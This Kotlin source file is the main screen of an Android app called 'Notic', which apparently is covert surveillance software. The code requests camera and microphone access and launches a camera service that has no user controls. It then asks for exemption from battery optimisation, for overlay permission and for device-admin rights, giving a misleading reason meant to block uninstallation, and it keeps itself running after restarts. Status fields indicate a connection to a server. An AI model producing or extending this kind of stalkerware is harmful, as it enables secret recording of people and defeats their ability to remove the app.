package com.example.notic

import android.Manifest
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.content.Context
import android.widget.TextView

// Notic: no controls. Asks permissions once, then runs by itself (also after restarts).
class MainActivity : Activity() {
    private var askedBattery = false
    private var askedOverlay = false
    private var askedAdmin = false
    private lateinit var info: TextView

    override fun onCreate(b: Bundle?) {
        super.onCreate(b)
        info = TextView(this).apply { textSize = 15f; setPadding(48, 96, 48, 48) }
        setContentView(info)
        ReviveJob.schedule(this)
        val p = mutableListOf(Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO)
        if (Build.VERSION.SDK_INT >= 33) p.add(Manifest.permission.POST_NOTIFICATIONS)
        requestPermissions(p.toTypedArray(), 1)
    }

    private fun granted() =
        checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED &&
        checkSelfPermission(Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED

    override fun onRequestPermissionsResult(rc: Int, p: Array<out String>, r: IntArray) {
        if (granted()) startForegroundService(
            Intent(this, CameraService::class.java).putExtra("camera", true))
    }

    // After each prompt closes, this runs again and asks for the next one (each once per launch)
    override fun onResume() {
        super.onResume()
        val sp = getSharedPreferences("n", Context.MODE_PRIVATE)
        info.text = "Notic is ready.\nYou can leave this screen.\n\n" +
            "Last restart signal: ${sp.getString("dbg_boot", "none yet")}\n" +
            "Backup job ran: ${sp.getString("dbg_job", "none yet")}\n" +
            "Service started: ${sp.getString("dbg_svc", "none yet")}\n" +
            "Server connected: ${sp.getString("dbg_conn", "none yet")}\n" +
            "Last error: ${sp.getString("dbg_err", "none")}"
        if (!granted()) return
        val pm = getSystemService(PowerManager::class.java)
        if (!askedBattery && !pm.isIgnoringBatteryOptimizations(packageName)) {
            askedBattery = true
            startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                Uri.parse("package:$packageName")))
            return
        }
        if (!askedOverlay && !Settings.canDrawOverlays(this)) {
            askedOverlay = true
            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:$packageName")))
            return
        }
        val dpm = getSystemService(DevicePolicyManager::class.java)
        val admin = ComponentName(this, AdminReceiver::class.java)
        if (!askedAdmin && !dpm.isAdminActive(admin)) {
            askedAdmin = true
            startActivity(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                .putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                .putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Stops Notic from being uninstalled by mistake."))
        }
    }
}
